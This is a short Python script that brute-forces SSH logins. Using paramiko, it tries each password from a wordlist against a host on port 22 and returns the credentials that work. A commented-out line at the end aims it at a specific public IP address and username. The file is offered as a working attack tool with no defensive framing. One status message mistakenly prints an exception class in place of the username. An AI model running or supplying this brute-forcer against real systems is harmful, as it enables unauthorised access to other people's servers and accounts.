import paramiko


def bruteforce(ip, wordlist, default_username):
    try:
        user_name = str(default_username.strip())
        file_name = wordlist.strip()
        host_name = str(ip.strip())
        list_password = open(file_name, 'r', encoding='UTF-8').readlines()
        print(
            f'\n[*] Trying connect to: {paramiko.AuthenticationException}@{host_name}\n\n')
        for password in list_password:
            index = list_password.index(password)
            password = password.rstrip('\n')
            try:
                print(f'[{index}] Trying with password: "{password}"')
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname=host_name, port=22,
                            username=user_name, password=password)
                shell = ssh.invoke_shell()
                ssh.close()
                return user_name, password
            except paramiko.AuthenticationException:
                pass
    except KeyboardInterrupt:
        exit(1)

# bruteforce('54.251.17.75', 'data/wordlist/password.txt', 'hauhppse14')
